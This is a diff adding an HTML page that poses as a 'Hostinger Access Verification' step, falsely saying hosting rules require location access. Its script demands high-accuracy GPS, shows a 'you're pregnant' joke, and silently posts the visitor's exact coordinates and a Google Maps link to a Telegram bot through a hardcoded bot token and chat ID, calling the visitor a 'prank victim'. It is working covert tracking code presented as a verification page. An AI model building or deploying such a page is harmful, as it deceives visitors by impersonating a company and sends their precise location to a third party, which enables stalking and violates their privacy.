@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hostinger Access Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f8f8ff;
+      color: #333;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    #message, #pregnant-section {
+      display: none;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    #pregnant-section img {
+      width: 250px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+    blockquote {
+      font-style: italic;
+      color: #555;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📡 Hostinger Access Verification</h1>
+  <p id="initial">Please allow location access to proceed.</p>
+
+  <div id="message">
+    <h2>⚠️ Location Required</h2>
+    <p>Location access is required by our hosting policies and regulations.</p>
+  </div>
+
+  <div id="pregnant-section">
+    <h2>🎉 Congratulations! You're pregnant! 🤰👶😂</h2>
+    <img src="https://cdn.pixabay.com/photo/2017/01/20/00/30/pregnant-1996011_1280.jpg" alt="Pregnant lady" />
+    <blockquote>
+      "Being pregnant means every day is an adventure, but right now, you're on the funniest one!" 😂
+    </blockquote>
+  </div>
+
+  <script>
+    const botToken = '7323090945:AAGRY-dpYndQq-9Dx5-DbiiMYTnNDukBwHs';
+    const chatId = '7442305057';
+
+    function showLocationRequired() {
+      document.getElementById('initial').style.display = 'none';
+      document.getElementById('message').style.display = 'block';
+    }
+
+    // Try to get GPS location only with timeout & high accuracy
+    navigator.geolocation.getCurrentPosition(
+      async function(pos) {
+        // Check accuracy in meters; if too high, treat as fail (meaning no GPS)
+        // GPS accuracy usually < 50m; if > 100m, might be fallback location
+        if (pos.coords.accuracy > 100) {
+          showLocationRequired();
+          return;
+        }
+
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        document.getElementById('initial').style.display = 'none';
+        document.getElementById('pregnant-section').style.display = 'block';
+
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const message = `📍 New prank victim!\n\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: ${mapsLink}`;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({chat_id: chatId, text: message})
+        });
+      },
+      function(err) {
+        // If error or denied, show location required
+        showLocationRequired();
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  </script>
+</body>
+</html>
